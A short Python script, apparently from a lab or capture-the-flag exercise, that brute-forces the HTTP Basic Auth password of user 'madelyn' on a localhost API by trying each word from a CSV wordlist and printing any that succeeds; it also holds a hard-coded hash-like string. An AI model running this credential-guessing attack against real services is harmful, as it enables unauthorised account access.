import base64
import requests
from requests.models import HTTPBasicAuth

username = 'madelyn'
retrieved_password = "d53dccc2693e90622c4257ea9ba04981"


def check_password(word):
    response = requests.get("http://localhost:5000/api/GetVersionA", auth=HTTPBasicAuth(username,word))
    if response.status_code == 200:
        print(word)



def decode(filename):
    file = open(filename,  "r")
    for word in file:
        word = word.strip()
        check_password(word)



def decode_csv(filename):
    file = open(filename, "r")
    for line in file:
        line_list = line.split(',')
        word = line_list[1].strip()

        check_password(word)


decode_csv("lemmas_60k.csv")
print("finished lemmas_60k.csv")

